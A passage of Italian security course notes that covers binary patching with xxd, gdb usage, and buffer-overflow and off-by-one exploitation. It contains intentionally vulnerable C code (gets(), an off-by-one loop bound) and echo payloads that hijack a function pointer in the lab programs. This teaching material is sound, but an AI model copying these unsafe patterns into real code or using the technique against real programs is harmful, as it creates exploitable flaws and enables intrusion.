+<p>Il programma <code>xxd</code> permette di produrre un file di testo contenente i byte in formato esadecimale di un eseguibile.</p>
+<p>Una volta modificato il file di testo, <code>xxd</code> permette di rigenerare il file binario.</p>
+<p>La sequenza di operazioni da fare è:</p>
+<ol>
+<li>produrre il file di testo contenente i byte dell’eseguibile: <code>xxd -g 1 count &gt; count.txt</code>
+<ul>
+<li>l’opzione <code>-g 1</code> permette di scrivere byte distinti</li>
+</ul>
+</li>
+<li>modificare il file <code>count.txt</code></li>
+<li>rigenerare il file eseguibile:
+<ul>
+<li><code>xxd -r count.txt &gt; count2</code></li>
+<li><code>chmod +x count2</code></li>
+<li><code>./count2</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="esempio">Esempio</h3>
+<p>Modifichiamo l’eseguibile di prima in modo che faccia un ciclo in meno (si ferma a 8 invece che a 9)</p>
+<p>Un modo per farlo è quello di cambiare il confronto di <code>&lt;=</code> in un <code>&lt;</code>. Quindi dovremmo cambiare i byte corrispondenti al comando assembly <code>jle</code> con i byte del comando <code>jl</code>.</p>
+<ol>
+<li>generiamo un file di testo contenente i byte dell’eseguibile: <code>xxd -g 1 count &gt; count.txt</code></li>
+<li>Dall’immagine precedente notiamo come i byte del comando <code>jle</code> sono <code>7e e0</code>, dobbiamo quindi modificare tali byte.</li>
+<li>Il byte che ci interessa è il <code>7e</code> che corrisponde all’opcode del comando <code>jle</code> (l’altro byte riguarda dove saltare)</li>
+<li>Online si possono trovare gli opcode di tutte le istruzioni (ad esempio <a href="http://sparksandflames.com/files/x86InstructionChart.html">qui</a> oppure <a href="http://ref.x86asm.net/coder32.html">qui</a>), e troviamo che l’opcode del comando <code>jl</code> è <code>7c</code>. sostituiamo quindi <code>7e</code> con <code>7c</code></li>
+<li>salviamo il file e lo riconvertiamo in eseguibile con: <code>xxd -r count.txt &gt; count2</code></li>
+<li>Diamo i permessi a questo file di essere eseguito con: <code>chmod +x count2</code></li>
+<li>ed eseguendolo notiamo come i numeri stampati arrivano fino a 8.</li>
+</ol>
+<h1 id="analisi-dei-programmi">Analisi dei programmi</h1>
+<p>I programmi possono essere analizzati in due modi:</p>
+<ul>
+<li>
+<p><strong>Analisi statica</strong>: che avviene ispezionando il codice assembly dell’eseguibile e provare a capire la logica del programma</p>
+</li>
+<li>
+<p><strong>Analisi dinamica</strong>: che avviene tramite l’uso di programmi chiamati <strong>debugger</strong>, in grado di osservare il comportamento del programma durante l’esecuzione.</p>
+<p>Un debugger molto utilizzato è <strong>gdb</strong>.</p>
+</li>
+</ul>
+<h2 id="gdb">gdb</h2>
+<p>Consideriamo sempre il seguente codice:</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token macro property"># <span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token keyword">int</span> i<span class="token punctuation">;</span>
+		<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Una volta compilato il programma possiamo eseguire gdb:</p>
+<pre class=" language-c"><code class="prism  language-c">$ gcc <span class="token operator">-</span>g count<span class="token punctuation">.</span>c <span class="token operator">-</span>o count
+$ gdb <span class="token operator">-</span>q count
+</code></pre>
+<p>nota che l’opzione <code>-g</code> sulla compilazione è importante perché aggiunge delle informazioni utili che gdb può utilizzare per migliorare la visualizzazione del debugging.</p>
+<p>Una volta eseguito gdb apparirà la sua linea di comando, prima di passare al disassemblaggio del programma, impostiamo la sintassi da utilizzare:</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> set disassembly<span class="token operator">-</span>flavor intel
+</code></pre>
+<p>disassembliamo la funzione <code>main</code>:</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disassemble main
+</code></pre>
+<p>ottenendo un output del genere</p>
+<p><img src="https://i.ibb.co/ChHynw2/image.png" alt="https://i.ibb.co/ChHynw2/image.png"></p>
+<p>È possibile impostare dei breakpoint per fermare l’esecuzione del programma in uno specifico punto (ad esempio su un indirizzo)</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">break</span> main
+</code></pre>
+<p>Possiamo lanciare l’esecuzione:</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> run
+</code></pre>
+<p>la quale si fermerà sul main.</p>
+<p>Rilanciando il disassembly notiamo come gli indirizzi sono stati rilocati</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disassembly main
+</code></pre>
+<p>possiamo quindi mettere un breakpoint sull’indirizzo dell’istruzione che ci interessa, ad esempio sulla riga dentro il ciclo for, con indirizzo di offset &lt;+17&gt;</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">break</span> <span class="token operator">*</span><span class="token number">0x000055555540069b</span>
+</code></pre>
+<p>Possiamo ispezionare i registri nella situazione attuale dell’esecuzione</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info registers
+</code></pre>
+<p><img src="https://i.ibb.co/8mT5wzM/image.png" alt="https://i.ibb.co/8mT5wzM/image.png"></p>
+<p>Possiamo ispezionare anche la memoria con il comando</p>
+<p><code>x/&lt;num&gt;&lt;format&gt;&lt;size&gt; &lt;addr&gt;</code></p>
+<p>dove:</p>
+<ul>
+<li><code>num</code>: numero di elementi da ispezionare</li>
+<li><code>format</code>: formato usato per mostrare il valore in memoria, tra cui abbiamo
+<ul>
+<li><code>o</code>: ottale</li>
+<li><code>x</code>: esadecimale</li>
+<li><code>u</code>: decimale senza segno</li>
+<li><code>t</code>: binario</li>
+<li><code>i</code>: istruzione</li>
+<li><code>c</code>: carattere</li>
+<li><code>s</code>: stringa</li>
+</ul>
+</li>
+<li><code>size</code>: grandezza degli elementi
+<ul>
+<li><code>b</code>: byte</li>
+<li><code>h</code>: 2 byte (16 bit)</li>
+<li><code>w</code>: 4 byte (32 bit)</li>
+<li><code>g</code>: 8 byte (64 bit)</li>
+</ul>
+</li>
+</ul>
+<p>Esempi:</p>
+<ul>
+<li>
+<p><code>(gdb) x/i main+22</code>:</p>
+<p>mostra l’istruzione alla posizione <code>main+22</code></p>
+<p><code>0x5555554006a0 &lt;main+22&gt;: lea rdi,[rip+0xad] # 0x555555400754</code></p>
+</li>
+<li>
+<p><code>(gdb) x/4i $rip</code>:</p>
+<p>mostra le quattro istruzioni rispetto all’instruction pointer</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token number">0x555555400692</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">8</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>     mov    DWORD PTR <span class="token punctuation">[</span>rbp<span class="token number">-0x4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span>
+<span class="token number">0x555555400699</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">15</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    jmp    <span class="token number">0x5555554006b5</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">43</span><span class="token operator">&gt;</span>
+<span class="token number">0x55555540069b</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">17</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    mov    eax<span class="token punctuation">,</span>DWORD PTR <span class="token punctuation">[</span>rbp<span class="token number">-0x4</span><span class="token punctuation">]</span>
+<span class="token number">0x55555540069e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">20</span><span class="token operator">&gt;</span><span class="token punctuation">:</span>    mov    esi<span class="token punctuation">,</span>eax
+</code></pre>
+</li>
+<li>
+<p><code>(gdb) x/s 0x555555400754</code>:</p>
+<p>mostra il contenuto di quel registro in formato stringa.</p>
+<p><code>0x555555400754: "%d “</code></p>
+</li>
+</ul>
+<p>Un utile cheatsheet con i comandi principali di gdb: <a href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">https://darkdust.net/files/GDB Cheat Sheet.pdf</a></p>
+<h1 id="buffer-overflow">Buffer overflow</h1>
+<p>Il buffer overflow è una tra le vulnerabilità più comuni tra i software, la principale causa di questa vulnerabilità è la scrittura di codice non corretta e sicura.</p>
+<p>Il <strong>buffer overflow</strong> è una condizione in cui è possibile riempire un buffer <strong>oltre</strong> alla sua capacità allocata, andando così a sovrascrivere altre informazioni in memoria.</p>
+<p>Questa vulnerabilità viene usata principalmente per:</p>
+<ul>
+<li>far crashare il sistema</li>
+<li>inserire dati che rompono l’integrità</li>
+<li>inserire codice per ottenere il controllo del sistema</li>
+</ul>
+<p>Linguaggi come C sono ritenuti “unsafe” e lasciano al programmatore la responsabilità di implementare i dovuti controlli per proteggersi dalle vulnerabilità sulla memoria.</p>
+<h2 id="rompere-l’integrità-e-crash">Rompere l’integrità e crash</h2>
+<p>Consideriamo il seguente codice C</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+
+<span class="token keyword">char</span> buffer1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"one"</span><span class="token punctuation">;</span>    <span class="token comment">// buffer of size 8 initialized with “one”</span>
+<span class="token keyword">int</span> value <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
+<span class="token keyword">char</span> buffer2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"two"</span><span class="token punctuation">;</span>    <span class="token comment">// buffer of size 8 initialized with “two”</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token comment">// prints: address = value,  before user input</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[BEFORE] buffer1 @ %1$p = %1$s\n"</span><span class="token punctuation">,</span> buffer1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[BEFORE] value @ %1$p = 0x%2$08x\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>value<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[BEFORE] buffer2 @ %1$p = %1$s\n"</span><span class="token punctuation">,</span> buffer2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter your input: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">gets</span><span class="token punctuation">(</span>buffer1<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// reads input into buffer1, whatever length!</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	  <span class="token comment">// prints: address = value,  after user input</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[AFTER] buffer1 @ %1$p = %1$s\n"</span><span class="token punctuation">,</span> buffer1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[AFTER] value @ %1$p = 0x%2$08x\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>value<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[AFTER] buffer2 @ %1$p = %1$s\n"</span><span class="token punctuation">,</span> buffer2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Abbiamo quindi  l’allocazione di un buffer, una variabile e un altro buffer.</p>
+<p>Viene preso un input utente e viene inserito nel primo buffer.</p>
+<p>Esecuzione:</p>
+<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token keyword">echo</span> <span class="token string">"prova"</span> <span class="token operator">|</span> ./prova
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> buffer1 @ 0x7fe3b7d9a010 <span class="token operator">=</span> one
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> value   @ 0x7fe3b7d9a018 <span class="token operator">=</span> 0x00000005
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> buffer2 @ 0x7fe3b7d9a020 <span class="token operator">=</span> two
+Please enter your input:
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> buffer1 @ 0x7fe3b7d9a010 <span class="token operator">=</span> prova
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> value   @ 0x7fe3b7d9a018 <span class="token operator">=</span> 0x00000005
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> buffer2 @ 0x7fe3b7d9a020 <span class="token operator">=</span> two
+</code></pre>
+<p>Con questo input non è successo nulla di strano, l’input è stato inserito nel primo buffer.</p>
+<p>Notiamo come gli indirizzi delle variabili sono sequenziali, distanziati di 8 byte.</p>
+<p>Se la dimensione dell’input rientra nella dimensione del buffer non ci sono problemi, ma non abbiamo controlli per forzare che ciò avvenga sempre, infatti è possibile inserire un input più grande:</p>
+<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token keyword">echo</span> <span class="token string">"AAAAAAAA"</span> <span class="token operator">|</span> ./prova
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> buffer1 @ 0x7f92ba1bc010 <span class="token operator">=</span> one
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> value   @ 0x7f92ba1bc018 <span class="token operator">=</span> 0x00000005
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> buffer2 @ 0x7f92ba1bc020 <span class="token operator">=</span> two
+Please enter your input:
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> buffer1 @ 0x7f92ba1bc010 <span class="token operator">=</span> AAAAAAAA
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> value   @ 0x7f92ba1bc018 <span class="token operator">=</span> 0x00000000
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> buffer2 @ 0x7f92ba1bc020 <span class="token operator">=</span> two
+</code></pre>
+<p>la stringa con 8 caratteri ‘A’ va in overflow in quanto la stringa contiene anche il <strong>carattere terminatore</strong> <code>0x00</code>. Vediamo infatti che viene sovrascritto il valore della variabile <code>value</code>.</p>
+<p>Nota che in <em>little endian</em> i byte vengono prima scritti quelli meno significativi (quelli più a destra).</p>
+<p>Se inseriamo 9 caratteri A, otteniamo il seguente output:</p>
+<pre class=" language-bash"><code class="prism  language-bash">$ <span class="token keyword">echo</span> <span class="token string">"AAAAAAAAA"</span> <span class="token operator">|</span> ./prova
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> buffer1 @ 0x7f669a8de010 <span class="token operator">=</span> one
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> value   @ 0x7f669a8de018 <span class="token operator">=</span> 0x00000005
+<span class="token punctuation">[</span>BEFORE<span class="token punctuation">]</span> buffer2 @ 0x7f669a8de020 <span class="token operator">=</span> two
+Please enter your input:
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> buffer1 @ 0x7f669a8de010 <span class="token operator">=</span> AAAAAAAAA
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> value   @ 0x7f669a8de018 <span class="token operator">=</span> 0x00000041
+<span class="token punctuation">[</span>AFTER<span class="token punctuation">]</span> buffer2 @ 0x7f669a8de020 <span class="token operator">=</span> two
+</code></pre>
+<p>Continuando ad aumentare il numero di caratteri in input, continuiamo a sovrascrivere le zone di memoria successive. Otteniamo quindi un <strong>buffer overflow</strong>. Ciò che può limitare la dimensione del nostro input è un errore di <strong>segmentation fault</strong> (e quindi crash del programma), che si verificherebbe nel caso arrivassimo a sovrascrivere zone di memoria non assegnate al nostro processo.</p>
+<p>La funzione <code>gets</code> è <em>unsafe</em> perché non limita in alcun modo la dimensione dell’input, e non dovrebbe venir mai utilizzata, inoltre durante la compilazione appare un <em>warning</em> che avverte di ciò.</p>
+<h2 id="controllare-il-flusso-di-codice">Controllare il flusso di codice</h2>
+<p>Con il buffer overflow è possibili modificare il normale flusso di codice, principalmente in due modi:</p>
+<ul>
+<li>sovrascrivendo il puntatore ad una funzione</li>
+<li>sovrascrivendo con nuovo codice</li>
+</ul>
+<p>Ad esempio se definiamo un tipo di dato:</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> element <span class="token punctuation">{</span>
+	 <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	 <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> element_t<span class="token punctuation">;</span>
+</code></pre>
+<p>contenente un buffer e un puntatore ad una funzione.</p>
+<p>In questo caso un buffer overflow può sovrascrivere il puntatore alla funzione, in modo da eseguire una funzione differente da quella attesa.</p>
+<p>Ad esempio:</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> element <span class="token punctuation">{</span>
+	 <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	 <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> element_t<span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">secret_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Secret function!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">void</span> <span class="token function">show_data</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Data = %s\n"</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 element_t e<span class="token punctuation">;</span>
+	 e<span class="token punctuation">.</span>f <span class="token operator">=</span> show_data<span class="token punctuation">;</span>   <span class="token comment">// legitimate function</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Insert data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">gets</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// reads data, possible buffer overflow</span>
+	 e<span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>L’obiettivo dell’attacco è quello di far invocare la funzione <code>secret_function()</code> invece di <code>show_data()</code>:</p>
+<p>Per semplificare l’attacco disabilitiamo l’opzione di compilazione <strong>PIE</strong> (<em>Position Independent Executable</em>) che rende più difficile exploitare la vulnerabilità in quanto renderebbe randomizzata la posizione in memoria del programma.</p>
+<p><code>$ gcc overflow-struct.c -o overflow-struct --no-pie --static</code></p>
+<p>Adesso usando gdb, possiamo ottenere l’indirizzo della funzione <code>secret_function()</code>:</p>
+<pre class=" language-nasm"><code class="prism  language-nasm"><span class="token operator">$</span> gdb <span class="token operator">-</span>q overflow<span class="token operator">-</span>struct
+...
+(gdb) x<span class="token operator">/</span>x secret_function
+	<span class="token number">0x400b4d</span> <span class="token operator">&lt;</span>secret_function<span class="token operator">&gt;</span>: <span class="token number">0xe5894855</span>
+</code></pre>
+<p>Adesso per riuscire a sovrascrivere il puntatore bisogna riempire il buffer fino alla sua dimensione massima con dei dati qualsiasi e poi andare in overflow inserendo l’indirizzo della <code>secret_function</code>.</p>
+<p>Nota che gli indirizzi sono a 8 byte e sono in little endian</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token keyword">echo</span> -e <span class="token string">"AAAAAAAAAAAAAAAA\x4d\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="token operator">|</span> ./overflow-struct
+Insert data: Secret function<span class="token operator">!</span>
+</code></pre>
+<h2 id="off-by-one-bug">Off-by-one bug</h2>
+<p>Un tipico errore di programmazione può essere il seguente, in cui viene sbagliato il controllo sull’indice finale di un ciclo.</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> element <span class="token punctuation">{</span>
+	 <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	 <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> element_t<span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">secret_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Secret function!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">void</span> <span class="token function">show_data</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Data = %s\n"</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 element_t e<span class="token punctuation">;</span>
+	 e<span class="token punctuation">.</span>f <span class="token operator">=</span> show_data<span class="token punctuation">;</span> <span class="token comment">// legitimate function</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Insert data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">memset</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+	 <span class="token comment">//the error in the following line is: i&lt;=sizeof(e.data)</span>
+	 <span class="token comment">//it should be i&lt;sizeof(e.data)</span>
+	 <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>c<span class="token operator">=</span><span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token constant">EOF</span> <span class="token operator">&amp;&amp;</span> c <span class="token operator">!=</span> <span class="token string">'\n'</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		 e<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>
+	 <span class="token punctuation">}</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"show_data = %p, secret_function = %p\n"</span><span class="token punctuation">,</span>show_data<span class="token punctuation">,</span>secret_function<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Con l’ultima <code>printf</code> andiamo a controllare gli indirizzi assegnati alle due funzioni: <code>show_data</code> e <code>secret_function</code>.</p>
+<p>eseguendo il programma più volte notiamo come gli indirizzi delle due funzioni <strong>cambiano solo per l’ultimo byte</strong> (una termina sempre con <code>dd</code> e l’altra con <code>ca</code> e il resto dell’indirizzo è comune per entrambi).</p>
+<pre class=" language-c"><code class="prism  language-c">$ echo <span class="token operator">-</span>e <span class="token string">"AAAAAAAAAAAAAAA"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>overflow<span class="token operator">-</span><span class="token keyword">struct</span><span class="token operator">-</span>offbyone
+Insert data<span class="token punctuation">:</span> Data <span class="token operator">=</span> AAAAAAAAAAAAAAA
+show_data <span class="token operator">=</span> <span class="token number">0x560bfd9287dd</span><span class="token punctuation">,</span> secret_function <span class="token operator">=</span> <span class="token number">0x560bfd9287ca</span>
+
+$ echo <span class="token operator">-</span>e <span class="token string">"AAAAAAAAAAAAAAA"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>overflow<span class="token operator">-</span><span class="token keyword">struct</span><span class="token operator">-</span>offbyone
+Insert data<span class="token punctuation">:</span> Data <span class="token operator">=</span> AAAAAAAAAAAAAAA
+show_data <span class="token operator">=</span> <span class="token number">0x56260d01f7dd</span><span class="token punctuation">,</span> secret_function <span class="token operator">=</span> <span class="token number">0x56260d01f7ca</span>
+
+$ echo <span class="token operator">-</span>e <span class="token string">"AAAAAAAAAAAAAAA"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>overflow<span class="token operator">-</span><span class="token keyword">struct</span><span class="token operator">-</span>offbyone
+Insert data<span class="token punctuation">:</span> Data <span class="token operator">=</span> AAAAAAAAAAAAAAA
+show_data <span class="token operator">=</span> <span class="token number">0x5646872967dd</span><span class="token punctuation">,</span> secret_function <span class="token operator">=</span> <span class="token number">0x5646872967ca</span>
+
+$ echo <span class="token operator">-</span>e <span class="token string">"AAAAAAAAAAAAAAA"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>overflow<span class="token operator">-</span><span class="token keyword">struct</span><span class="token operator">-</span>offbyone
+Insert data<span class="token punctuation">:</span> Data <span class="token operator">=</span> AAAAAAAAAAAAAAA
+show_data <span class="token operator">=</span> <span class="token number">0x55f42b85f7dd</span><span class="token punctuation">,</span> secret_function <span class="token operator">=</span> <span class="token number">0x55f42b85f7ca</span>
+</code></pre>
+<p>Sfruttando l’errore sul controllo dell’indice del buffer possiamo modificare tale byte, che ci è sufficiente per cambiare la funzione invocata:</p>
+<pre class=" language-c"><code class="prism  language-c">$ echo <span class="token operator">-</span>e <span class="token string">"AAAAAAAAAAAAAAAA\xca"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>overflow<span class="token operator">-</span><span class="token keyword">struct</span><span class="token operator">-</span>offbyone
+Insert data<span class="token punctuation">:</span> Secret function<span class="token operator">!</span>
+show_data <span class="token operator">=</span> <span class="token number">0x560975daa7dd</span><span class="token punctuation">,</span> secret_function <span class="token operator">=</span> <span class="token number">0x560975daa7ca</span>
+</code></pre>
+<h1 id="stack-overflow">Stack overflow</h1>
+<p>Un <em>buffer overflow</em> che si verifica nello stack, si chiama <strong>stack overflow</strong>.</p>
+<p>Subito dopo le variabili locali, nello stack sono presenti il <strong>vecchio stack pointer</strong> e l’<strong>indirizzo di ritorno</strong>. Uno stack overflow può sovrascriverli per modificare il flusso di codice ed eseguire codice arbitrario.</p>
+<p>Partendo da questa situazione, vediamo gli step che vengono fatti da un <code>return</code> di funzione</p>
+<p><img src="https://i.ibb.co/sPGp08Y/image.png" alt="https://i.ibb.co/sPGp08Y/image.png"></p>
+<ol>
+<li>
+<p>la <code>mov</code> mette in <code>rax</code> il valore di ritorno <code>b</code></p>
